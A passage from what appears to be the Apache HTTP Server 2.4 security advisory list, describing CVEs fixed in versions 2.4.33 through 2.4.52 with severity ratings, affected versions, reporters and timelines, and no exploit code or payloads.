### moderate: Possible NULL dereference or SSRF in forward proxy configurations in Apache HTTP Server 2.4.51 and earlier ([CVE-2021-44224](https://www.cve.org/CVERecord?id=CVE-2021-44224))

A crafted URI sent to httpd configured as a forward proxy (ProxyRequests on) can cause a crash (NULL pointer dereference) or, for configurations mixing forward and reverse proxy declarations, can allow for requests to be directed to a declared Unix Domain Socket endpoint (Server Side Request Forgery).

This issue affects Apache HTTP Server 2.4.7 up to 2.4.51 (included).

Acknowledgements:

* æ¼äº®é¼
* TengMA(@Te3t123)

| Reported to security team | 2021-11-18 |
| --- | --- |
| fixed by r1895955, r1896044 in 2.4.x | 2021-12-14 |
| Update 2.4.52 released | 2021-12-20 |
| Affects | >=2.4.7, <=2.4.51 |

### important: Possible buffer overflow when parsing multipart content in mod\_lua of Apache HTTP Server 2.4.51 and earlier ([CVE-2021-44790](https://www.cve.org/CVERecord?id=CVE-2021-44790))

A carefully crafted request body can cause a buffer overflow in the mod\_lua multipart parser (r:parsebody() called from Lua scripts).

The Apache httpd team is not aware of an exploit for the vulnerabilty though it might be possible to craft one.

This issue affects Apache HTTP Server 2.4.51 and earlier.

Acknowledgements: Chamal

| Reported to security team | 2021-12-07 |
| --- | --- |
| Fixed by r1896039 in 2.4.x | 2021-12-16 |
| Update 2.4.52 released | 2021-12-20 |
| Affects | <=2.4.51 |

# Fixed in Apache HTTP Server 2.4.51

### critical: Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of CVE-2021-41773) ([CVE-2021-42013](https://www.cve.org/CVERecord?id=CVE-2021-42013))

It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.

Acknowledgements:

* Reported by Juan Escobar from Dreamlab Technologies
* Reported by Fernando Muñoz from NULL Life CTF Team
* Reported by Shungo Kumasaka
* Reported by Nattapon Jongcharoen

| Reported to security team | 2021-10-06 |
| --- | --- |
| fixed by r1893977, r1893980, r1893982 in 2.4.x | 2021-10-07 |
| Update 2.4.51 released | 2021-10-07 |
| Affects | 2.4.50, 2.4.49 |

# Fixed in Apache HTTP Server 2.4.50

### moderate: null pointer dereference in h2 fuzzing ([CVE-2021-41524](https://www.cve.org/CVERecord?id=CVE-2021-41524))

While fuzzing the 2.4.49 httpd, a new null pointer dereference was detected during HTTP/2 request processing,

allowing an external source to DoS the server. This requires a specially crafted request.

The vulnerability was recently introduced in version 2.4.49. No exploit is known to the project.

Acknowledgements: Apache httpd team would like to thank LI ZHI XIN from NSFocus Security Team for reporting this issue.

| Reported to security team | 2021-09-17 |
| --- | --- |
| fixed by r1893655 in 2.4.x | 2021-09-26 |
| Update 2.4.50 released | 2021-10-04 |
| Affects | 2.4.49 |

### critical: Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 ([CVE-2021-41773](https://www.cve.org/CVERecord?id=CVE-2021-41773))

A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

This issue is known to be exploited in the wild.

This issue only affects Apache 2.4.49 and not earlier versions.

Acknowledgements: This issue was reported by Ash Daulton along with the cPanel Security Team

| Reported to security team | 2021-09-29 |
| --- | --- |
| fixed by r1893775 in 2.4.x | 2021-10-01 |
| Update 2.4.50 released | 2021-10-04 |
| Affects | 2.4.49 |

# Fixed in Apache HTTP Server 2.4.49

### moderate: Request splitting via HTTP/2 method injection and mod\_proxy ([CVE-2021-33193](https://www.cve.org/CVERecord?id=CVE-2021-33193))

A crafted method sent through HTTP/2 will bypass validation and be forwarded by mod\_proxy, which can lead to request splitting or cache poisoning.

This issue affects Apache HTTP Server 2.4.17 to 2.4.48.

Acknowledgements: Reported by James Kettle of PortSwigger

| Reported to security team | 2021-05-11 |
| --- | --- |
| Issue public | 2021-08-06 |
| Update 2.4.49 released | 2021-09-16 |
| Affects | <=2.4.48, !<2.4.17 |

### moderate: NULL pointer dereference in httpd core ([CVE-2021-34798](https://www.cve.org/CVERecord?id=CVE-2021-34798))

Malformed requests may cause the server to dereference a NULL pointer.

This issue affects Apache HTTP Server 2.4.48 and earlier.

Acknowledgements: The issue was discovered by the Apache HTTP security team

| Update 2.4.49 released | 2021-09-16 |
| --- | --- |
| Affects | <=2.4.48 |

### moderate: mod\_proxy\_uwsgi out of bound read ([CVE-2021-36160](https://www.cve.org/CVERecord?id=CVE-2021-36160))

A carefully crafted request uri-path can cause mod\_proxy\_uwsgi to read above the allocated memory and crash (DoS).

This issue affects Apache HTTP Server versions 2.4.30 to 2.4.48 (inclusive).

Acknowledgements: LI ZHI XIN from NSFocus Security Team

| Reported to security team | 2021-04-26 |
| --- | --- |
| Update 2.4.49 release | 2021-09-16 |
| Affects | <=2.4.48, !<2.4.30 |

### low: ap\_escape\_quotes buffer overflow ([CVE-2021-39275](https://www.cve.org/CVERecord?id=CVE-2021-39275))

ap\_escape\_quotes() may write beyond the end of a buffer when given malicious input.

No included modules pass untrusted data to these functions, but third-party / external modules may.

This issue affects Apache HTTP Server 2.4.48 and earlier.

Acknowledgements: ClusterFuzz

| Update 2.4.49 released | 2021-09-16 |
| --- | --- |
| Affects | <=2.4.48 |

### important: mod\_proxy SSRF ([CVE-2021-40438](https://www.cve.org/CVERecord?id=CVE-2021-40438))

A crafted request uri-path can cause mod\_proxy to forward the request to an origin server choosen by the remote user.

This issue affects Apache HTTP Server 2.4.48 and earlier.

Acknowledgements: The issue was discovered by the Apache HTTP security team while analysing CVE-2021-36160

| Update 2.4.49 released | 2021-09-16 |
| --- | --- |
| Affects | <=2.4.48 |

# Fixed in Apache HTTP Server 2.4.48

### moderate: mod\_proxy\_wstunnel tunneling of non Upgraded connections ([CVE-2019-17567](https://www.cve.org/CVERecord?id=CVE-2019-17567))

Apache HTTP Server versions 2.4.6 to 2.4.46 mod\_proxy\_wstunnel configured on an URL that is not necessarily Upgraded by the origin server was tunneling the whole connection regardless, thus allowing for subsequent requests on the same connection to pass through with no HTTP validation, authentication or authorization possibly configured.

Acknowledgements: Reported by Mikhail Egorov (<0ang3el gmail.com>)

| Reported to security team | 2019-10-05 |
| --- | --- |
| Issue public | 2021-06-01 |
| Update 2.4.48 released | 2021-06-01 |
| Affects | 2.4.46, 2.4.43, 2.4.41, 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6 |

### moderate: Improper Handling of Insufficient Privileges ([CVE-2020-13938](https://www.cve.org/CVERecord?id=CVE-2020-13938))

Apache HTTP Server versions 2.4.0 to 2.4.46 Unprivileged local users can stop httpd on Windows

Acknowledgements: Discovered by Ivan Zhakov

| Reported to security team | 2021-01-26 |
| --- | --- |
| Issue public | 2021-06-01 |
| Update 2.4.48 released | 2021-06-01 |
| Affects | 2.4.46, 2.4.43, 2.4.41, 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

### low: mod\_proxy\_http NULL pointer dereference ([CVE-2020-13950](https://www.cve.org/CVERecord?id=CVE-2020-13950))

Apache HTTP Server versions 2.4.41 to 2.4.46 mod\_proxy\_http can be made to crash (NULL pointer dereference) with specially crafted requests using both Content-Length and Transfer-Encoding headers, leading to a Denial of Service

Acknowledgements: Reported by Marc Stern (<marc.stern@approach-cyber.com>)

| Reported to security team | 2020-09-11 |
| --- | --- |
| Issue public | 2021-06-01 |
| Update 2.4.48 released | 2021-06-01 |
| Affects | 2.4.46, 2.4.43, 2.4.41 |

### low: mod\_auth\_digest possible stack overflow by one nul byte ([CVE-2020-35452](https://www.cve.org/CVERecord?id=CVE-2020-35452))

Apache HTTP Server versions 2.4.0 to 2.4.46 A specially crafted Digest nonce can cause a stack overflow in mod\_auth\_digest. There is no report of this overflow being exploitable, nor the Apache HTTP Server team could create one, though some particular compiler and/or compilation option might make it possible, with limited consequences anyway due to the size (a single byte) and the value (zero byte) of the overflow

Acknowledgements: This issue was discovered and reported by GHSL team member @antonio-morales (Antonio Morales)

| Reported to security team | 2020-11-11 |
| --- | --- |
| Issue public | 2021-06-01 |
| Update 2.4.48 released | 2021-06-01 |
| Affects | 2.4.46, 2.4.43, 2.4.41, 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

### low: mod\_session NULL pointer dereference ([CVE-2021-26690](https://www.cve.org/CVERecord?id=CVE-2021-26690))

Apache HTTP Server versions 2.4.0 to 2.4.46 A specially crafted Cookie header handled by mod\_session can cause a NULL pointer dereference and crash, leading to a possible Denial Of Service

Acknowledgements: This issue was discovered and reported by GHSL team member @antonio-morales (Antonio Morales)

| Reported to security team | 2021-02-08 |
| --- | --- |
| Issue public | 2021-06-01 |
| Update 2.4.48 released | 2021-06-01 |
| Affects | 2.4.46, 2.4.43, 2.4.41, 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

### low: mod\_session response handling heap overflow ([CVE-2021-26691](https://www.cve.org/CVERecord?id=CVE-2021-26691))

Apache HTTP Server versions 2.4.0 to 2.4.46 A specially crafted SessionHeader sent by an origin server could cause a heap overflow

Acknowledgements: Discovered internally Christophe Jaillet

| Reported to security team | 2021-03-01 |
| --- | --- |
| Issue public | 2021-06-01 |
| Update 2.4.48 released | 2021-06-01 |
| Affects | 2.4.46, 2.4.43, 2.4.41, 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

### moderate: Unexpected URL matching with 'MergeSlashes OFF' ([CVE-2021-30641](https://www.cve.org/CVERecord?id=CVE-2021-30641))

Apache HTTP Server versions 2.4.39 to 2.4.46 Unexpected matching behavior with 'MergeSlashes OFF'

Acknowledgements: Discovered by Christoph Anton Mitterer

| Reported to security team | 2021-04-14 |
| --- | --- |
| Issue public | 2021-06-01 |
| Update 2.4.48 released | 2021-06-01 |
| Affects | 2.4.46, 2.4.43, 2.4.41, 2.4.39 |

### important: NULL pointer dereference on specially crafted HTTP/2 request ([CVE-2021-31618](https://www.cve.org/CVERecord?id=CVE-2021-31618))

Apache HTTP Server protocol handler for the HTTP/2 protocol checks received request headers against the size limitations as configured for the server and used for the HTTP/1 protocol as well. On violation of these restrictions and HTTP response is sent to the client with a status code indicating why the request was rejected.

This rejection response was not fully initialised in the HTTP/2 protocol handler if the offending header was the very first one received or appeared in a a footer. This led to a NULL pointer dereference on initialised memory, crashing reliably the child process. Since such a triggering HTTP/2 request is easy to craft and submit, this can be exploited to DoS the server.

This issue affected mod\_http2 1.15.17 and Apache HTTP Server version 2.4.47 only. Apache HTTP Server 2.4.47 was never released.

Acknowledgements: Apache HTTP server would like to thank LI ZHI XIN from NSFoucs for reporting this.

| Reported to security team | 2021-04-22 |
| --- | --- |
| Issue public | 2021-06-01 |
| Update 2.4.48 released | 2021-06-01 |
| Affects | 2.4.47 |

# Fixed in Apache HTTP Server 2.4.44

### important: Push Diary Crash on Specifically Crafted HTTP/2 Header ([CVE-2020-9490](https://www.cve.org/CVERecord?id=CVE-2020-9490))

In Apache HTTP Server versions 2.4.20 to 2.4.43, a specially crafted value for the 'Cache-Digest' header in a HTTP/2 request would result in a crash when the server actually tries to HTTP/2 PUSH a resource afterwards. Configuring the HTTP/2 feature via "H2Push off" will mitigate this vulnerability for unpatched servers.

Acknowledgements: Felix Wilhelm of Google Project Zero

| Reported to security team | 2020-04-24 |
| --- | --- |
| Issue public | 2020-08-07 |
| Update 2.4.44 released | 2020-08-07 |
| Affects | 2.4.43, 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20 |

### moderate: mod\_proxy\_uwsgi buffer overflow ([CVE-2020-11984](https://www.cve.org/CVERecord?id=CVE-2020-11984))

In Apache HTTP Server versions 2.4.32 to 2.4.43, mod\_proxy\_uwsgi has a information disclosure and possible RCE

Acknowledgements: Discovered by Felix Wilhelm of Google Project Zero

| Reported to security team | 2020-07-22 |
| --- | --- |
| Issue public | 2020-08-07 |
| Update 2.4.44 released | 2020-08-07 |
| Affects | 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33 |

### moderate: Push Diary Crash on Specifically Crafted HTTP/2 Header ([CVE-2020-11993](https://www.cve.org/CVERecord?id=CVE-2020-11993))

In Apache HTTP Server versions 2.4.20 to 2.4.43, when trace/debug was enabled for the HTTP/2 module and on certain traffic edge patterns, logging statements were made on the wrong connection, causing concurrent use of memory pools.

Configuring the LogLevel of mod\_http2 above "info" will mitigate this vulnerability for unpatched servers.

Acknowledgements: Felix Wilhelm of Google Project Zero

| Reported to security team | 2020-06-16 |
| --- | --- |
| Issue public | 2020-08-07 |
| Update 2.4.44 released | 2020-08-07 |
| Affects | 2.4.43, 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20 |

# Fixed in Apache HTTP Server 2.4.42

### low: mod\_rewrite CWE-601 open redirect ([CVE-2020-1927](https://www.cve.org/CVERecord?id=CVE-2020-1927))

In Apache HTTP Server versions 2.4.0 to 2.4.41 some mod\_rewrite configurations vulnerable to open redirect.

Acknowledgements: The issue was discovered by Fabrice Perez

| Reported to security team | 2019-12-05 |
| --- | --- |
| Issue public | 2020-04-01 |
| Update 2.4.42 released | 2020-04-01 |
| Affects | 2.4.41, 2.4.40, 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

### low: mod\_proxy\_ftp use of uninitialized value ([CVE-2020-1934](https://www.cve.org/CVERecord?id=CVE-2020-1934))

in Apache HTTP Server versions 2.4.0 to 2.4.41, mod\_proxy\_ftp use of uninitialized value with malicious FTP backend.

Acknowledgements: The issue was discovered by Chamal De Silva

| Reported to security team | 2020-01-03 |
| --- | --- |
| Issue public | 2020-04-01 |
| Update 2.4.42 released | 2020-04-01 |
| Affects | 2.4.41, 2.4.40, 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

# Fixed in Apache HTTP Server 2.4.41

### moderate: mod\_http2, DoS attack by exhausting h2 workers. ([CVE-2019-9517](https://www.cve.org/CVERecord?id=CVE-2019-9517))

A malicious client could perform a DoS attack by flooding a connection with requests and basically never reading responses on the TCP connection. Depending on h2 worker dimensioning, it was possible to block those with relatively few connections.

Acknowledgements: The issue was discovered by Jonathan Looney of Netflix.

| Reported to security team | 2019-04-10 |
| --- | --- |
| Issue public | 2019-08-14 |
| Update 2.4.41 released | 2019-08-14 |
| Affects | 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.32, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20 |

### moderate: mod\_http2, memory corruption on early pushes ([CVE-2019-10081](https://www.cve.org/CVERecord?id=CVE-2019-10081))

HTTP/2 very early pushes, for example configured with "H2PushResource", could lead to an overwrite of memory in the pushing request's pool, leading to crashes. The memory copied is that of the configured push link header values, not data supplied by the client.

Acknowledgements: The issue was discovered by Craig Young of Tripwire VERT, <vuln-report@secur3.us>.

| Reported to security team | 2019-04-10 |
| --- | --- |
| Issue public | 2019-08-14 |
| Update 2.4.41 released | 2019-08-14 |
| Affects | 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.32, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20 |

### moderate: mod\_http2, read-after-free in h2 connection shutdown ([CVE-2019-10082](https://www.cve.org/CVERecord?id=CVE-2019-10082))

Using fuzzed network input, the http/2 session handling could be made to read memory after being freed, during connection shutdown.

Acknowledgements: The issue was discovered by Craig Young of Tripwire VERT, <vuln-report@secur3.us>.

| Reported to security team | 2019-04-12 |
| --- | --- |
| Issue public | 2019-08-14 |
| Update 2.4.41 released | 2019-08-14 |
| Affects | 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.32, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18 |

### low: Limited cross-site scripting in mod\_proxy error page ([CVE-2019-10092](https://www.cve.org/CVERecord?id=CVE-2019-10092))

A limited cross-site scripting issue was reported affecting the mod\_proxy error page. An attacker could cause the link on the error page to be malfomed and instead point to a page of their choice. This would only be exploitable where a server was set up with proxying enabled but was misconfigured in such a way that the Proxy Error page was displayed. We have taken this opportunity to also remove request data from many other in-built error messages. Note however this issue did not affect them directly and their output was already escaped to prevent cross-site scripting attacks.

Acknowledgements: This issue was reported by Matei "Mal" Badanoiu

| Reported to security team | 2019-07-09 |
| --- | --- |
| Issue public | 2019-08-14 |
| Update 2.4.41 released | 2019-08-14 |
| Affects | 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

### moderate: CVE-2019-10097 mod\_remoteip: Stack buffer overflow and NULL pointer dereference ([CVE-2019-10097](https://www.cve.org/CVERecord?id=CVE-2019-10097))

When mod\_remoteip was configured to use a trusted intermediary proxy server using the "PROXY" protocol, a specially crafted PROXY header could trigger a stack buffer overflow or NULL pointer deference. This vulnerability could only be triggered by a trusted proxy and not by untrusted HTTP clients.

Acknowledgements: The issue was discovered by Daniel McCarney <cpu@letsencrypt.org> Let's Encrypt / Internet Security Research Group (ISRG)

| Reported to security team | 2019-07-23 |
| --- | --- |
| Issue public | 2019-08-14 |
| Update 2.4.41 released | 2019-08-14 |
| Affects | 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33 |

### low: mod\_rewrite potential open redirect ([CVE-2019-10098](https://www.cve.org/CVERecord?id=CVE-2019-10098))

Redirects configured with mod\_rewrite that were intended to be self-referential might be fooled by encoded newlines and redirect instead to an an unexpected URL within the request URL.

Acknowledgements: The issue was discovered by Yukitsugu Sasaki

| Reported to security team | 2019-03-26 |
| --- | --- |
| Issue public | 2019-08-14 |
| Update 2.4.41 released | 2019-08-14 |
| Affects | 2.4.39, 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

# Fixed in Apache HTTP Server 2.4.39

### low: mod\_http2, read-after-free on a string compare ([CVE-2019-0196](https://www.cve.org/CVERecord?id=CVE-2019-0196))

Using fuzzed network input, the http/2 request handling could be made to access freed memory in string comparision when determining the method of a request and thus process the request incorrectly.

Acknowledgements: The issue was discovered by Craig Young, <vuln-report@secur3.us>.

| Reported to security team | 2019-01-29 |
| --- | --- |
| Issue public | 2019-04-01 |
| Update 2.4.39 released | 2019-04-01 |
| Affects | 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17 |

### low: mod\_http2, possible crash on late upgrade ([CVE-2019-0197](https://www.cve.org/CVERecord?id=CVE-2019-0197))

When HTTP/2 was enabled for a http: host or H2Upgrade was enabled for h2 on a https: host, an Upgrade request from http/1.1 to http/2 that was not the first request on a connection could lead to a misconfiguration and crash. A server that never enabled the h2 protocol or that only enabled it for https: and did not configure the "H2Upgrade on" is unaffected by this.

Acknowledgements: The issue was discovered by Stefan Eissing, greenbytes.de.

| Reported to security team | 2019-01-29 |
| --- | --- |
| Issue public | 2019-04-01 |
| Update 2.4.39 released | 2019-04-01 |
| Affects | 2.4.38, 2.4.37, 2.4.35, 2.4.34 |

### important: Apache HTTP Server privilege escalation from modules' scripts ([CVE-2019-0211](https://www.cve.org/CVERecord?id=CVE-2019-0211))

In Apache HTTP Server 2.4 releases 2.4.17 to 2.4.38, with MPM event, worker or prefork, code executing in less-privileged child processes or threads (including scripts executed by an in-process scripting interpreter) could execute arbitrary code with the privileges of the parent process (usually root) by manipulating the scoreboard. Non-Unix systems are not affected.

Acknowledgements: The issue was discovered by Charles Fol.

| Reported to security team | 2019-02-22 |
| --- | --- |
| Issue public | 2019-04-01 |
| Update 2.4.39 released | 2019-04-01 |
| Affects | 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17 |

### important: mod\_ssl access control bypass ([CVE-2019-0215](https://www.cve.org/CVERecord?id=CVE-2019-0215))

In Apache HTTP Server 2.4 releases 2.4.37 and 2.4.38, a bug in mod\_ssl when using per-location client certificate verification with TLSv1.3 allowed a client supporting Post-Handshake Authentication to bypass configured access control restrictions.

Acknowledgements: The issue was discovered by Michael Kaufmann.

| Reported to security team | 2019-01-23 |
| --- | --- |
| Issue public | 2019-04-01 |
| Update 2.4.39 released | 2019-04-01 |
| Affects | 2.4.38, 2.4.37 |

### important: mod\_auth\_digest access control bypass ([CVE-2019-0217](https://www.cve.org/CVERecord?id=CVE-2019-0217))

In Apache HTTP Server 2.4 release 2.4.38 and prior, a race condition in mod\_auth\_digest when running in a threaded server could allow a user with valid credentials to authenticate using another username, bypassing configured access control restrictions.

Acknowledgements: The issue was discovered by Simon Kappel.

| Reported to security team | 2019-01-29 |
| --- | --- |
| Issue public | 2019-04-01 |
| Update 2.4.39 released | 2019-04-01 |
| Affects | 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

### low: Apache httpd URL normalization inconsistincy ([CVE-2019-0220](https://www.cve.org/CVERecord?id=CVE-2019-0220))

When the path component of a request URL contains multiple consecutive slashes ('/'), directives such as LocationMatch and RewriteRule must account for duplicates in regular expressions while other aspects of the servers processing will implicitly collapse them.

Acknowledgements: The issue was discovered by Bernhard Lorenz <bernhard.lorenz@alphastrike.io> of Alpha Strike Labs GmbH.

| Reported to security team | 2019-01-20 |
| --- | --- |
| Issue public | 2019-04-01 |
| Update 2.4.39 released | 2019-04-01 |
| Affects | 2.4.38, 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

# Fixed in Apache HTTP Server 2.4.38

### low: DoS for HTTP/2 connections via slow request bodies ([CVE-2018-17189](https://www.cve.org/CVERecord?id=CVE-2018-17189))

By sending request bodies in a slow loris way to plain resources, the h2 stream for that request unnecessarily occupied a server thread cleaning up that incoming data. This affects only HTTP/2 connections. A possible mitigation is to not enable the h2 protocol.

Acknowledgements: The issue was discovered by Gal Goldshtein of F5 Networks.

| Reported to security team | 2018-10-16 |
| --- | --- |
| Issue public | 2019-01-22 |
| Update 2.4.38 released | 2019-02-28 |
| Affects | 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17 |

### low: mod\_session\_cookie does not respect expiry time ([CVE-2018-17199](https://www.cve.org/CVERecord?id=CVE-2018-17199))

In Apache HTTP Server 2.4 release 2.4.37 and prior, mod\_session checks the session expiry time before decoding the session. This causes session expiry time to be ignored for mod\_session\_cookie sessions since the expiry time is loaded when the session is decoded.

Acknowledgements: The issue was discovered by Diego Angulo from ImExHS.

| Reported to security team | 2018-10-08 |
| --- | --- |
| Issue public | 2019-01-22 |
| Update 2.4.38 released | 2019-02-28 |
| Affects | 2.4.37, 2.4.35, 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.4.0 |

### important: mod\_ssl 2.4.37 remote DoS when used with OpenSSL 1.1.1 ([CVE-2019-0190](https://www.cve.org/CVERecord?id=CVE-2019-0190))

A bug exists in the way mod\_ssl handled client renegotiations. A remote attacker could send a carefully crafted request that would cause mod\_ssl to enter a loop leading to a denial of service. This bug can be only triggered with Apache HTTP Server version 2.4.37 when using OpenSSL version 1.1.1 or later, due to an interaction in changes to handling of renegotiation attempts.

Acknowledgements: The issue was discovered through user bug reports.

| Reported to security team | 2019-01-01 |
| --- | --- |
| Issue public | 2019-01-22 |
| Update 2.4.38 released | 2019-02-28 |
| Affects | 2.4.37 |

# Fixed in Apache HTTP Server 2.4.35

### low: DoS for HTTP/2 connections by continuous SETTINGS ([CVE-2018-11763](https://www.cve.org/CVERecord?id=CVE-2018-11763))

By sending continous SETTINGS frames of maximum size an ongoing HTTP/2 connection could be kept busy and would never time out. This can be abused for a DoS on the server. This only affect a server that has enabled the h2 protocol.

Acknowledgements: The issue was discovered by Gal Goldshtein of F5 Networks.

| Reported to security team | 2018-07-18 |
| --- | --- |
| Issue public | 2018-09-25 |
| Update 2.4.35 released | 2018-09-29 |
| Affects | 2.4.34, 2.4.33, 2.4.30, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18 |

# Fixed in Apache HTTP Server 2.4.34

### low: DoS for HTTP/2 connections by crafted requests ([CVE-2018-1333](https://www.cve.org/CVERecord?id=CVE-2018-1333))

By specially crafting HTTP/2 requests, workers would be allocated 60 seconds longer than necessary, leading to worker exhaustion and a denial of service. This issue only affects servers that have configured and enabled HTTP/2 support, which is not the default

Acknowledgements: The issue was discovered by Craig Young of Tripwire VERT.

| Reported to security team | 2018-05-08 |
| --- | --- |
| Issue public | 2018-07-18 |
| Update 2.4.34 released | 2018-07-15 |
| Affects | 2.4.33, 2.4.29, 2.4.28, 2.4.27, 2.4.26, 2.4.25, 2.4.23, 2.4.20, 2.4.18 |

### moderate: mod\_md, DoS via Coredumps on specially crafted requests ([CVE-2018-8011](https://www.cve.org/CVERecord?id=CVE-2018-8011))

By specially crafting HTTP requests, the mod\_md challenge handler would dereference a NULL pointer and cause the child process to segfault. This could be used to DoS the server.

Acknowledgements: The issue was discovered by Daniel Caminada <daniel.caminada@ergon.ch>.

| Reported to security team | 2018-06-29 |
| --- | --- |
| Issue public | 2018-07-18 |
| Update 2.4.34 released | 2018-07-15 |
| Affects | 2.4.33 |

# Fixed in Apache HTTP Server 2.4.33

### low: Out of bound write in mod\_authnz\_ldap when using too small Accept-Language values ([CVE-2017-15710](https://www.cve.org/CVERecord?id=CVE-2017-15710))

